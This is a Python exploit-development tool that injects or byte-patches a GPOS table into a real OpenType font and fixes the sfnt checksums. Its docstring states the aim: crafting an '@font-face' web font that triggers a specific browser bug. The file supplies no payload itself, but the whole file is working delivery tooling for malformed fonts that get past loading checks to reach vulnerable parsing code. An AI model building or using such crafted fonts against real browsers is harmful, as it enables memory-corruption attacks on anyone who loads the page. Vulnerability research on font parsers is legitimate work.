#!/usr/bin/env python3
"""Replace/mutate the GPOS table in an OTTO (CFF) font, fixing sfnt checksums.

Why: the SystemWeb browser bug (flat 0xbac40) is reached by a crafted web font
(`@font-face`), specifically a GPOS table. This tool lets you take a real OTTO
font (so the CFF/cmap/name load normally) and swap or patch only GPOS.

usage:
  inject_gpos.py --base STIXGeneral.otf --out crafted.otf --gpos gpos.bin
  inject_gpos.py --base STIXGeneral.otf --out crafted.otf --patch 0x12=ffff --patch 0x1a=00
  inject_gpos.py --base STIXGeneral.otf --out crafted.otf --dump-gpos gpos.bin
  python3 inject_gpos.py --selfcheck
"""
import argparse
import struct
import sys


def read_sfnt(data):
    if len(data) < 12:
        raise ValueError("too short")
    ver, num = struct.unpack_from(">IH", data, 0)
    if ver not in (0x4F54544F, 0x00010000, 0x74727565):  # OTTO, TrueType, 'true'
        raise ValueError(f"not an sfnt: {data[:4]!r}")
    if num == 0 or num > 512:
        raise ValueError("bad table count")
    tables = {}
    for i in range(num):
        off = 12 + 16 * i
        tag, chk, toff, tlen = struct.unpack_from(">4sIII", data, off)
        if toff + tlen > len(data):
            raise ValueError(f"table {tag!r} out of bounds")
        tables[tag] = data[toff:toff + tlen]
    return ver, tables


def checksum(b):
    b = b + b"\x00" * ((4 - len(b) % 4) % 4)
    s = 0
    for i in range(0, len(b), 4):
        s = (s + struct.unpack_from(">I", b, i)[0]) & 0xFFFFFFFF
    return s


def build_sfnt(ver, tables):
    tags = sorted(tables)
    n = len(tags)
    es = 0
    while (1 << (es + 1)) <= n:
        es += 1
    sr = (1 << es) * 16
    rs = n * 16 - sr

    if b"head" in tables:
        h = bytearray(tables[b"head"])
        struct.pack_into(">I", h, 8, 0)          # checkSumAdjustment = 0
        tables[b"head"] = bytes(h)

    hdr = struct.pack(">IHHHH", ver, n, sr, es, rs)
    data_off = 12 + 16 * n
    recs = []
    body = bytearray()
    for tag in tags:
        t = tables[tag]
        recs.append((tag, checksum(t), data_off + len(body), len(t)))
        body += t + b"\x00" * ((4 - len(t) % 4) % 4)

    out = bytearray(hdr + b"".join(struct.pack(">4sIII", *r) for r in recs) + bytes(body))

    if b"head" in tables:
        for i, (tag, chk, toff, tlen) in enumerate(recs):
            if tag == b"head":
                adj = (0xB1B0AFBA - checksum(bytes(out))) & 0xFFFFFFFF
                struct.pack_into(">I", out, toff + 8, adj)
                break
    return bytes(out)


def parse_and_rebuild(data):
    ver, tables = read_sfnt(data)
    return ver, tables


def _selfcheck():
    import glob
    cands = ("/System/Library/Fonts/Supplemental/STIXGeneral.otf",
             "/System/Library/Fonts/LastResort.otf")
    base = next((p for p in cands if __import__("os").path.exists(p)), None)
    if not base:
        print("selfcheck: no base font found, skipped")
        return
    data = open(base, "rb").read()
    ver, tables = read_sfnt(data)
    assert b"GPOS" in tables and b"head" in tables
    out = build_sfnt(ver, dict(tables))
    ver2, tables2 = read_sfnt(out)
    assert ver2 == ver and set(tables2) == set(tables)
    for k in tables:
        if k == b"head":
            a = bytearray(tables[k]); struct.pack_into(">I", a, 8, 0)
            b = bytearray(tables2[k]); struct.pack_into(">I", b, 8, 0)
            assert bytes(a) == bytes(b), "head (excluding checkSumAdjustment)"
        else:
            assert tables2[k] == tables[k], k
    print(f"selfcheck ok on {base}: {len(tables)} tables, {len(out)} bytes")
    return True


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--base")
    ap.add_argument("--out")
    ap.add_argument("--gpos", help="file containing the new GPOS table bytes")
    ap.add_argument("--patch", action="append", default=[],
                    help="OFFSET=HEX (repeatable) patch inside GPOS, e.g. 0x12=ffff")
    ap.add_argument("--dump-gpos", help="write the base font's GPOS table here and exit")
    ap.add_argument("--selfcheck", action="store_true")
    a = ap.parse_args()

    if a.selfcheck:
        _selfcheck()
        sys.exit(0)
    if not a.base:
        ap.error("--base is required")

    data = open(a.base, "rb").read()
    ver, tables = read_sfnt(data)
    if b"GPOS" not in tables:
        ap.error("base font has no GPOS table")

    if a.dump_gpos:
        open(a.dump_gpos, "wb").write(tables[b"GPOS"])
        print(f"wrote GPOS ({len(tables[b'GPOS'])} bytes) to {a.dump_gpos}")
        sys.exit(0)

    if not a.out:
        ap.error("--out is required")

    gpos = bytearray(tables[b"GPOS"])
    if a.gpos:
        gpos = bytearray(open(a.gpos, "rb").read())
    for p in a.patch:
        off_s, hex_s = p.split("=", 1)
        off = int(off_s, 0)
        b = bytes.fromhex(hex_s)
        gpos[off:off + len(b)] = b

    tables[b"GPOS"] = bytes(gpos)
    out = build_sfnt(ver, tables)
    open(a.out, "wb").write(out)
    print(f"wrote {a.out}: {len(out)} bytes, GPOS={len(gpos)} bytes "
          f"({'patched' if a.patch else 'replaced' if a.gpos else 'unchanged'})")
